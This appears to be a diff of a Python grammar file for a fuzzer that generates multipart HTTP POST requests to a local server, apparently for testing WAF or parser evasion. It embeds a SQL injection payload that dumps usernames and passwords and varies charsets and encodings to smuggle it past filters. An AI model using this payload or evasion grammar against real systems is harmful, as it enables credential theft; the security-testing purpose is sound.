@@ -1,23 +1,30 @@
-from utils import utf7encode,base64encode
-# https://www.rfc-editor.org/rfc/rfc1867
-
-# class ParamNode(Node):
-#     def expand(self):
-#         super().expand()
-TAINT_KEY = "id"
+TAINT_KEY = "taint"
 # TAINT_KEY = "data"
 # TAINT = "-1 union select 1,key,3 from flag"
-TAINT  = "1' union select 1,group_concat(user,0x3a,password) from users #"
+TAINT_VAL  = "1' union select 1,group_concat(user,0x3a,password) from users #"
+PATH = "/"
+HOST = "localhost:6000"
+
+CHARSET_POOL = ["ascii","utf-7","base64","utf-8","utf-8le","utf-8be","utf-16","quoted-printable"]
 
 grammar = {
     "<start>": [
-        ["<content_type_headers>","\r\n\r\n","<body>"]
+        ["<request_line>","<request_headers>","<content_length_header>","<content_type_headers>","\r\n\r\n","<body>"]
+    ],
+    "<request_line>": [
+        [f"POST __PATH__ HTTP/1.1\r\n"]
+    ],
+    "<request_headers>": [
+        ["User-Agent: Chrome/104.0.5112.102\r\n",f"HOST: __HOST__\r\n"]
+    ],
+    "<content_length_header>" :[
+        ["Content-Length: __LEN__\r\n"],
     ],
     "<content_type_headers>":[
         (["<content_type_header>"],0.7),
         (["<content_type_header>","<next_line>","<content_type_headers>"],0.1),
-        (["<content_type_header>","<next_line>","<content_encoding_header>"],0.1),
-        (["<content_type_header>","<next_line>","<transfer_encoding_header>"],0.1),
+        (["<content_type_header>","<next_line>","<content_encoding_header>"],0.1)
+        # (["<content_type_header>","<next_line>","<transfer_encoding_header>"],0.1),
     ],
     "<content_type_header>":[
         ["Content-Type:","<blank_token>","<media_type>","<param_seperator>","<blank_token>","<header_params>"],
@@ -30,28 +37,29 @@ grammar = {
         ["Transfer-Encoding:","<blank_token>","chunked",",","chunked"],
     ],
     "<media_type>":[
-        (["application/x-www-form-urlencoded"],0.1),
+        #(["application/x-www-form-urlencoded"],0.2),
        # ["application/xml"],
        # ["application/json"],
-        (["multipart/form-data"],0.8),
-        (["text/plain"],0.1)
+        ["multipart/form-data"],
+        #(["multipart/form-data"],0.8),
+        #(["text/plain"],0.1)
        # ["multipart/mixed"],
     ],
     "<header_params>":[
         ["<charset_param>","<param_seperator>","<header_params>"],
         ["<boundary_param>","<param_seperator>","<header_params>"],
-        ["<media_type>","<param_seperator>","<header_params>"],
-        ["<other_param>","<param_seperator>","<header_params>"],
+        #["<media_type>","<param_seperator>","<header_params>"],
+        #["<other_param>","<param_seperator>","<header_params>"],
         ["<none>"]
     ],
     r"<(\w+)_param>":[
         [r"<\1_param_key>","=",r"<\1_param_value_field>"],
-        [r"<\1_param_key>","*=",r"<\1_param_value_field>"],
+        #[r"<\1_param_key>","*=",r"<\1_param_value_field>"],
     ],
     r"<(\w+)_param_value_field>":[
         ['"',r'<\1_param_value>','"'],
         ["'",r'<\1_param_value>',"'"],
-        ["us-ascii","'","en","'",r"<\1_param_value>"],
+        #["us-ascii","'","en","'",r"<\1_param_value>"],
         [r'<\1_param_value>'],
     ],
     "<charset_param_key>":[
@@ -70,10 +78,11 @@ grammar = {
         ["name"],
     ],
     "<name_param_value>":[
-        [TAINT_KEY],
+        #["a"],
+        ["__TAINTKEY__"],
     ],
     "<taint_param_key>":[
-        [TAINT_KEY],
+        ["__TAINTKEY__"],
     ],
     "<taint_param_value>":[
         ["<taint_token>"]
@@ -85,8 +94,8 @@ grammar = {
         ["<other_param>"]
     ],
     "<other_param_key>":[
-        ["xxx"],
-        ["yyy[0]"],
+        #["xxx"],
+        #["yyy[0]"],
         ["<filename_param_key>"],
     ],
     "<other_param_value>":[
@@ -158,15 +167,11 @@ grammar = {
     ],
     "<boundary_token>":[
         (["boundary"],0.8),
-        (["boun dary"],0.1),
+        #(["boun dary"],0.1),
         ([""],0.1)
     ],
     "<charset_token>":[
-        ["utf-8"],
-        ["utf-7"],
-        ["utf-16"],
-        ["base64"],
-        ['quoted-printable'],
+        ["__CHAR__"]
     ],
     "<blank_token>":[
         ([" "],0.8),
@@ -174,10 +179,7 @@ grammar = {
         ([" "],0.1)
     ],
     "<taint_token>":[
-        ([TAINT],0.6),
-        ([utf7encode(TAINT)],0.1),
-        ([TAINT.encode("utf-16be").decode("utf-8")],0.1),
-        ([base64encode(TAINT)],0.1),
-        ([''.join(["="+hex(ord(x))[2:].upper() for x in TAINT])],0.1),
+        (["__TAINTVAL__"],0.9),
+        (["__DUMBTAINTVAL__"],0.1)
     ],
 }
